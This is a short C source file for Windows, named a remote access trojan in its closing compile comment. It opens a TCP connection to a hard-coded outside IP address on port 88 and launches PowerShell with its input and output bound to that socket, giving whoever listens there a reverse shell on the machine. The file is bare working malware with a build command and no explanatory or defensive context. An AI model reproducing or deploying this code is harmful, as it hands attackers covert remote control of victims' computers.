#include <winsock2.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;

SOCKET Winsock;

struct sockaddr_in hax; 

char ip_addr[16] = "93.93.112.211"; 

char port[6] = "88";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()

{

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host; 

    host = gethostbyname(ip_addr);

    strncpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)), sizeof(ip_addr) - 1);

    hax.sin_family = AF_INET;

    hax.sin_port = htons(atoi(port));

    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));

    ini_processo.cb = sizeof(ini_processo);

    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 

    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR powershell[255] = TEXT("powershell.exe");

    CreateProcess(NULL, powershell, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;

}


//gcc RAT.c -o RAT -lws2_32